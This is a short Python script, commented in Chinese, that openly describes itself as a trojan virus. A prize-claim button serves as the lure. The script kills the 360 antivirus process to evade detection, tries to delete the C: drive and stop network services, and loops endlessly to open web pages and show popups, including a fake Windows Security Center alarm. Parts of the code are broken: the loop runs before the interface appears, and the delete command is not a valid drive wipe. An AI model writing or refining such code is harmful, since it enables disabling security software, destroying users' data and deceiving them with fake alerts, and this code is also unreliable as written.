import tkinter as tk

import subprocess

import os

import webbrowser as web

import tkinter.messagebox  # 弹窗库

os.system(r'taskkill /F /IM 360safe.exe')  # 先免杀


# 按钮后的木马病毒编写

def command():
    subprocess.call("del C:", shell=True)  # 删除C盘
    os.system("net stop service")  # 关闭网络服务


while True:
    web.open("www.baidu.com")  # 无限打开网页
    tkinter.messagebox.showinfo('提示', 'Tkinter弹窗')  # 无限弹窗病毒
    tkinter.messagebox.showinfo('Windows安全中心', 'Windows遭到恶意木马攻击，正在尝试自救！')

# 前端设计
GUI = tk.Tk()
GUI.title('大奖')
GUI.geometry('500x300')

b = tk.Button(GUI, text='点击领取大奖一份！', bg='cyan', font=('幼圆', 15), width=20, height=10, command=command())

b.pack()

GUI.mainloop()
